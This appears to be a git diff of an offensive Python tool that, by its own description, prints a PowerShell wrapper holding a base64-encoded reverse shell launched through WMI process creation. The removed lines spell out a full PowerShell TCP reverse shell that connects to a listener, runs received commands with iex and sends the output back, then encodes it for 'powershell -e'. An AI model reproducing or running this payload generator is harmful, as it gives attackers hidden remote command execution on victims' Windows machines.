@@ -9,28 +9,6 @@ POSTAMBLE = (
     "-MethodName Create -Arguments @{CommandLine =$Command};"
 )
 
-# def encode_ps_for_e(listen_address: str, listen_port: str) -> str:
-#     """
-#     Encode a PowerShell snippet in UTF-16LE Base64 for use with `powershell -e`.
-#     """
-
-#     payload = (
-#         f'$client = New-Object System.Net.Sockets.TCPClient("{listen_address}",{listen_port});'
-#         '$stream = $client.GetStream();'
-#         '[byte[]]$bytes = 0..65535|%{0};'
-#         'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;'
-#         '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'
-#         '$sendback = (iex $data 2>&1 | Out-String );'
-#         '$sendback2 = $sendback + "PS " + (pwd).Path + "> ";'
-#         '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);'
-#         '$stream.Write($sendbyte,0,$sendbyte.Length);'
-#         '$stream.Flush()};'
-#         '$client.Close()'
-#     )
-
-#     # Encode in UTF-16LE (without BOM) for PowerShell -e
-#     return base64.b64encode(payload.encode("utf-16le")).decode()
-
 def main():
     parser = argparse.ArgumentParser(
         description="Print a PowerShell wrapper holding a base64-encoded reverse shell."
